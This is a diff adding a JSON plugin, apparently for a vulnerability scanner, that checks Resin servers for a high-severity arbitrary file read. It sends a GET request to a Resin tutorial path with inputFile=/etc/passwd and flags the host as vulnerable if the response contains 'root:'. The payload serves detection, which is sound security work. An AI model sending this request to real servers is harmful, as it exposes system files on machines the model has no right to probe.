@@ -1,0 +1,18 @@
+{
+    "info" : "可通过此漏洞读取服务器上的文件 resource",
+    "name" : "Resin任意文件读取_1",
+    "level" : "高危",
+    "type" : "文件读取",
+    "author" : "wolf@YSRC",
+    "url": "",
+	"keyword" : "tag:resin",
+	"source" : 1,
+    "plugin" : {
+        "url" : "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd",
+        "tag" : "存在任意文件读取漏洞 /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd",
+        "analyzing" : "keyword",
+        "analyzingdata" : "root:",
+        "data" : "",
+        "method" : "GET"
+    }
+}
